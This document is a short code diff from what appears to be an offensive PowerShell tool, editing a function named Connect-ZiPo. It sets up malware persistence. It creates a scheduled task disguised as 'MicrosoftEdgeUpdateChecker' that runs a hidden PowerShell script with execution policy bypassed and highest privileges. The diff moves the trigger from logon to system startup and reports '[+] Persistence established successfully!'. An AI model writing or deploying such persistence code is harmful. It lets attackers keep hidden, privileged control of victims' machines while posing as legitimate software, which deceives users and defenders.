@@ -28,9 +28,10 @@ function Connect-ZiPo {
 
         $taskName = "MicrosoftEdgeUpdateChecker"
 
-        schtasks /Create /SC ONLOGON /TN $taskName `
+        schtasks /Create /SC ONSTART /TN "MicrosoftEdgeUpdateChecker" `
             /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" `
-            /RL HIGHEST /F | Out-Null
+            /RL HIGHEST /RU "$env:USERNAME" /F
+
 
         return "[+] Persistence established successfully!"
     }
